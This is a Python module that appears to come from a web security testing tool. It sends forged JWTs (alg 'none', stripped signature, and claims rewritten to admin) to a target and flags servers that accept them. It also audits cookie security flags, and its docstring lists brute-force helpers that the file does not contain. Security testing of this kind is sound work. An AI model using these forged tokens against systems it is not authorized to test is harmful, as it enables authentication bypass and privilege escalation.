"""
tools/auth_tester.py
--------------------
Authentication & session security attack testing module.

Tests:
- JWT algorithm 'none' bypass
- JWT signature stripping
- Default credential brute-force helpers
- Session cookie attribute validation
"""

from __future__ import annotations

import base64
import json
from typing import Any, Dict, List
import httpx


class AuthTester:
    """
    Tests target application for JWT, authentication bypass, and session flaws.
    """

    def __init__(self, base_url: str) -> None:
        self.base_url = base_url.rstrip("/")

    async def test_jwt_none_alg(self, endpoint: str, sample_jwt: str) -> Dict[str, Any]:
        """
        Attempt JWT algorithm 'none' signature bypass.
        """
        parts = sample_jwt.split(".")
        if len(parts) != 3:
            return {"vulnerable": False, "evidence": "Invalid JWT format"}

        # Modify header to alg=none
        none_header = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0"  # {"alg":"none","type":"JWT"}
        none_jwt = f"{none_header}.{parts[1]}."

        url = f"{self.base_url}/{endpoint.lstrip('/')}"
        headers = {"Authorization": f"Bearer {none_jwt}"}

        async with httpx.AsyncClient(timeout=3.0) as client:
            try:
                resp = await client.get(url, headers=headers)
                if resp.status_code == 200:
                    return {
                        "vulnerable": True,
                        "evidence": resp.text[:500],
                        "payload": none_jwt
                    }
            except Exception as e:
                return {"vulnerable": False, "evidence": str(e)}

        return {"vulnerable": False, "evidence": "Status code non-200"}

    async def test_jwt_empty_sig(self, endpoint: str, sample_jwt: str) -> Dict[str, Any]:
        """
        Test if the server accepts a JWT with an empty signature (signature stripping).
        """
        parts = sample_jwt.split(".")
        if len(parts) != 3:
            return {"vulnerable": False, "evidence": "Invalid JWT format"}

        # Keep header and payload, empty the signature
        stripped_jwt = f"{parts[0]}.{parts[1]}."

        url = f"{self.base_url}/{endpoint.lstrip('/')}"
        headers = {"Authorization": f"Bearer {stripped_jwt}"}

        async with httpx.AsyncClient(timeout=3.0) as client:
            try:
                resp = await client.get(url, headers=headers)
                if resp.status_code == 200:
                    return {
                        "vulnerable": True,
                        "evidence": f"Server accepted JWT with empty signature (HTTP {resp.status_code}): {resp.text[:300]}",
                        "payload": stripped_jwt
                    }
            except Exception as e:
                return {"vulnerable": False, "evidence": str(e)}

        return {"vulnerable": False, "evidence": "Status code non-200"}

    async def test_jwt_role_escalation(self, endpoint: str, sample_jwt: str) -> Dict[str, Any]:
        """
        Attempt to modify JWT payload to escalate role to admin.
        """
        parts = sample_jwt.split(".")
        if len(parts) != 3:
            return {"vulnerable": False, "evidence": "Invalid JWT format"}

        try:
            # Decode payload, modify role
            padded = parts[1] + "=" * (4 - len(parts[1]) % 4)
            payload_data = json.loads(base64.urlsafe_b64decode(padded))
            payload_data["role"] = "admin"
            payload_data["admin"] = True
            payload_data["is_admin"] = True

            new_payload = base64.urlsafe_b64encode(
                json.dumps(payload_data).encode()
            ).rstrip(b"=").decode()

            # Use alg:none header
            none_header = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0"
            escalated_jwt = f"{none_header}.{new_payload}."

            url = f"{self.base_url}/{endpoint.lstrip('/')}"
            headers = {"Authorization": f"Bearer {escalated_jwt}"}

            async with httpx.AsyncClient(timeout=3.0) as client:
                resp = await client.get(url, headers=headers)
                if resp.status_code == 200:
                    return {
                        "vulnerable": True,
                        "evidence": f"Role escalation accepted (HTTP {resp.status_code}): {resp.text[:300]}",
                        "payload": escalated_jwt,
                        "modified_claims": payload_data
                    }
        except Exception as e:
            return {"vulnerable": False, "evidence": str(e)}

        return {"vulnerable": False, "evidence": "Role escalation rejected"}

    async def check_cookie_security(self, endpoint: str = "/") -> Dict[str, Any]:
        """
        Analyze Set-Cookie headers for security attributes.
        Returns a dict with cookie details and any security issues found.
        """
        url = f"{self.base_url}/{endpoint.lstrip('/')}"

        async with httpx.AsyncClient(timeout=3.0) as client:
            try:
                resp = await client.get(url)
                issues: List[str] = []
                cookies_analyzed = 0

                for cookie in resp.cookies.jar:
                    cookies_analyzed += 1
                    name = cookie.name

                    # Check security attributes from the raw header
                    raw_headers = resp.headers.get_list("set-cookie")
                    for raw in raw_headers:
                        if name in raw:
                            raw_lower = raw.lower()
                            if "httponly" not in raw_lower:
                                issues.append(f"Cookie '{name}' missing HttpOnly flag")
                            if "secure" not in raw_lower:
                                issues.append(f"Cookie '{name}' missing Secure flag")
                            if "samesite" not in raw_lower:
                                issues.append(f"Cookie '{name}' missing SameSite attribute")

                return {
                    "cookies_found": cookies_analyzed,
                    "issues": issues,
                    "vulnerable": len(issues) > 0
                }

            except Exception as e:
                return {"cookies_found": 0, "issues": [], "vulnerable": False, "error": str(e)}
